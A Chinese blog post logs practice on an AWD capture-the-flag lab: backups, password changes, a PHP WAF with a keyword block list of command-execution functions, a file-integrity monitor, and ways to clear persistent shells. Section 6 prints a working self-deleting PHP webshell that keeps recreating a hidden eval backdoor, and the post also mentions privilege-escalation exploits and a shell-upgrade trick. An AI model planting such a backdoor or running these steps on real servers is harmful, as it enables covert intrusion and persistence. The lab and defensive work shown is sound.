---
title: "记一次awd靶场的练习"
date: 2025-03-10T09:52:02+08:00
draft: false
password: ""
categories:
- 学习记录
tags:
- awd
- ctf
- 靶场
---

最近闲来无事，在玩一些入门级awd靶场，之前也没接触过，记录一些操作

# 1. 备份

源码备份
`tar -zcvf /tmp/awd.tar.gz /var/www/html`

数据库备份
`mysqldump -u usr -p pwd --databases dbname > back.sql`

# 2. 预置后门排查

用D盾或河马扫一遍源码，看有没有自带后门

有后门就直接拿来用，没有就需要自己挖，挖不到可能就是源码是二开的，需要进行代码审计

# 3. 改密码

修改web和数据库账号密码

```
use mysql;

update mysql.user set authentication_string=password('新密码') where user='用户名';

flush privileges;
```

# 4. 上waf

网上找的
```php
<?php
//find /var/www/html -type f -path "*.php" | xargs sed -i "s/<?php/<?php\nrequire_once('waf.php');\n/g"

    error_reporting(0);
    define('LOG_FILENAME','llllllllllllllllllllllllllog.txt');
    function waf()
    {
        if (!function_exists('getallheaders')) {
            function getallheaders() {
                foreach ($_SERVER as $name => $value) {
                    if (substr($name, 0, 5) == 'HTTP_')
                        $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
                }
                return $headers;
            }
        }
        $input = array();
        if(!empty($_GET))$input["Get"]=$_GET;
        if(!empty($_POST))$input["Post"]=$_POST;
        if(!empty($_COOKIE))$input["Cookie"]=$_COOKIE;
        $header = getallheaders();
        $files = $_FILES;
        $ip = $_SERVER["REMOTE_ADDR"];
        $method = $_SERVER['REQUEST_METHOD'];
        $filepath = $_SERVER['REQUEST_URI'];
        //rewirte shell which uploaded by others, you can do more
        foreach ($_FILES as $key => $value) {
            $files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']);
            file_put_contents($_FILES[$key]['tmp_name'], "virink");
        }
        unset($header['Accept']);//fix a bug
        $input["Header"]=$header;
        //deal with
        $pattern = "select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex";
        $pattern .= "|base|file|flag|cat";
        $pattern .= "|file_put_contents|fwrite|curl|system|eval|assert";
        $pattern .="|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore";
        $pattern .="|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec";
        $vpattern = explode("|",$pattern);
        $bool = false;
        foreach ($input as $k => $v) {
            foreach($vpattern as $value){
                foreach ($v as $kk => $vv) {
                    if (preg_match( "/$value/i", $vv )){
                        $bool = true;
                        logging($input);
                        break;
                    }
                }
                if($bool) break;
            }
            if($bool) break;
        }
    }
    function logging($var){
        file_put_contents(LOG_FILENAME, "\r\n".date("Y-m-d H:i:s",time())." ".$_SERVER["REMOTE_ADDR"]." ".$_SERVER['REQUEST_METHOD']." ".$_SERVER['REQUEST_URI']."\r\n".print_r($var, true), FILE_APPEND);
        //die("hacker!\n");
        // die() or unset($_GET) or unset($_POST) or unset($_COOKIE);
    }
    waf();
?>
```

# 5. 上监控

也是网上找的

```python
# -*- coding: utf-8 -*-
#use: python file_check.py ./

import os
import hashlib
import shutil
import ntpath
import time

CWD = os.getcwd()
FILE_MD5_DICT = {}      # 文件MD5字典
ORIGIN_FILE_LIST = []

# 特殊文件路径字符串
Special_path_str = 'nwsxqcf_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'
bakstring = 'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'
logstring = 'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'
webshellstring = 'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'
difffile = 'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'

Special_string = 'drops_log'  # 免死金牌
UNICODE_ENCODING = "utf-8"
INVALID_UNICODE_CHAR_FORMAT = r"\?%02x"

# 文件路径字典
spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))
Special_path = {
    'bak' : os.path.realpath(os.path.join(spec_base_path, bakstring)),
    'log' : os.path.realpath(os.path.join(spec_base_path, logstring)),
    'webshell' : os.path.realpath(os.path.join(spec_base_path, webshellstring)),
    'difffile' : os.path.realpath(os.path.join(spec_base_path, difffile)),
}

def isListLike(value):
    return isinstance(value, (list, tuple, set))

# 获取Unicode编码
def getUnicode(value, encoding=None, noneToNull=False):

    if noneToNull and value is None:
        return NULL

    if isListLike(value):
        value = list(getUnicode(_, encoding, noneToNull) for _ in value)
        return value

    if isinstance(value, unicode):
        return value
    elif isinstance(value, basestring):
        while True:
            try:
                return unicode(value, encoding or UNICODE_ENCODING)
            except UnicodeDecodeError, ex:
                try:
                    return unicode(value, UNICODE_ENCODING)
                except:
                    value = value[:ex.start] + "".join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]
    else:
        try:
            return unicode(value)
        except UnicodeDecodeError:
            return unicode(str(value), errors="ignore")

# 目录创建
def mkdir_p(path):
    import errno
    try:
        os.makedirs(path)
    except OSError as exc:
        if exc.errno == errno.EEXIST and os.path.isdir(path):
            pass
        else: raise

# 获取当前所有文件路径
def getfilelist(cwd):
    filelist = []
    for root,subdirs, files in os.walk(cwd):
        for filepath in files:
            originalfile = os.path.join(root, filepath)
            if Special_path_str not in originalfile:
                filelist.append(originalfile)
    return filelist

# 计算机文件MD5值
def calcMD5(filepath):
    try:
        with open(filepath,'rb') as f:
            md5obj = hashlib.md5()
            md5obj.update(f.read())
            hash = md5obj.hexdigest()
            return hash
    except Exception, e:
        print u'[!] getmd5_error : ' + getUnicode(filepath)
        print getUnicode(e)
        try:
            ORIGIN_FILE_LIST.remove(filepath)
            FILE_MD5_DICT.pop(filepath, None)
        except KeyError, e:
            pass

# 获取所有文件MD5
def getfilemd5dict(filelist = []):
    filemd5dict = {}
    for ori_file in filelist:
        if Special_path_str not in ori_file:
            md5 = calcMD5(os.path.realpath(ori_file))
            if md5:
                filemd5dict[ori_file] = md5
    return filemd5dict

# 备份所有文件
def backup_file(filelist=[]):
    # if len(os.listdir(Special_path['bak'])) == 0:
    for filepath in filelist:
        if Special_path_str not in filepath:
            shutil.copy2(filepath, Special_path['bak'])

if __name__ == '__main__':
    print u'---------start------------'
    for value in Special_path:
        mkdir_p(Special_path[value])
    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件
    ORIGIN_FILE_LIST = getfilelist(CWD)
    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)
    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG
    print u'[*] pre work end!'
    while True:
        file_list = getfilelist(CWD)
        # 移除新上传文件
        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))
        if len(diff_file_list) != 0:
            # import pdb;pdb.set_trace()
            for filepath in diff_file_list:
                try:
                    f = open(filepath, 'r').read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u'[*] webshell find : ' + getUnicode(filepath)
                        shutil.move(filepath, os.path.join(Special_path['webshell'], ntpath.basename(filepath) + '.txt'))
                    except Exception as e:
                        print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filepath)
                    try:
                        f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                        f.write('newfile: ' + getUnicode(filepath) + ' : ' + str(time.ctime()) + '\n')
                        f.close()
                    except Exception as e:
                        print u'[-] log error : file move error: ' + getUnicode(e)

        # 防止任意文件被修改,还原被修改文件
        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)
        for filekey in md5_dict:
            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:
                try:
                    f = open(filekey, 'r').read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u'[*] file had be change : ' + getUnicode(filekey)
                        shutil.move(filekey, os.path.join(Special_path['difffile'], ntpath.basename(filekey) + '.txt'))
                        shutil.move(os.path.join(Special_path['bak'], ntpath.basename(filekey)), filekey)
                    except Exception as e:
                        print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filekey)
                    try:
                        f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                        f.write('diff_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + '\n')
                        f.close()
                    except Exception as e:
                        print u'[-] log error : done_diff: ' + getUnicode(filekey)
                        pass
        time.sleep(2)
        # print '[*] ' + getUnicode(time.ctime())
```

```php
<?php
//find /var/www/html -type f -path "*.php" | xargs sed -i "s/<?php/<?php\nrequire_once('log.php');\n/g"
date_default_timezone_set('Asia/Shanghai');
$ip       = $_SERVER["REMOTE_ADDR"]; //记录访问者的ip
$filename = $_SERVER['PHP_SELF'];   //访问者要访问的文件名
$parameter   = $_SERVER["QUERY_STRING"]; //访问者要请求的参数
$time     =   date('Y-m-d H:i:s',time()); //访问时间
$logadd = '来访时间：'.$time.'-->'.'访问链接：'.'http://'.$ip.$filename.'?'.$parameter."\r\n";

// log记录
$fh = fopen("log.txt", "a");
fwrite($fh, $logadd);
fclose($fh);
?>
```

或者直接上[watchbird](https://github.com/leohearts/awd-watchbird)

# 6. 不死马

```php
<?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = '.test.php';
    $code = '<?php if(md5($_GET["pass"])=="098f6bcd4621d373cade4e832627b4f6"){@eval($_POST[test]);} ?>';
    while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2018-12-01 09:10:12" .test.php');
        usleep(5000);
    }
?>
```

需要访问一次生效

# 7. 清除不死马

- 查进程
`top | grep httpd`或`ps aux`

找到进程后用`kill -9 -1`杀掉

当然这一步可能需要较高权限，而awd往往给的权限较小

- 创建同名文件夹
`rm xxx.php && mkdir xxx.php && touch xxx.php/1.txt`

- 条件竞争
  - 写个与不死马同名文件
    ```php
    <?php
      ignore_user_abort(true);
      set_time_limit(0);
      unlink(__FILE__);
      $file = '.test.php';
      $code = 'come on!';
      while (1){
          file_put_contents($file,$code);
          system('touch -m -d "2018-12-01 09:10:12" .test.php');
            usleep(1000);
      }
    ?>
    ```
    访问一次生效，usleep的时间要比不死马小，$code修改为无害内容即可

  - 一直删除不死马文件
   新建`rmshell.sh`文件
    ```bash
    #!/bin/bash
    while true 
    do
    #kill -9 进程ID
    rm -rf .test.php
    done
    ```
    赋予777权限（如果可以）
    后台运行：`nohup ./rmshell.sh &`

# 8. 提权【题外话】

靶场比较老旧，顺便看了下提权，正常一般不会让提权。

使用CDK可查看有哪些方式可以提权，若可以提权，CDK会提供提权exp链接；

将exp下载下来make，然后拖到awd靶机运行，若运行报错可尝试将exp拖到靶机make运行。

# 9. 技巧收获

shell不完整？

尝试输入bash或者使用万能命令`script /dev/null -c bash`拿完整shell

# 参考

https://github.com/admintony/Prepare-for-AWD

https://github.com/Aabyss-Team/AWD-Guide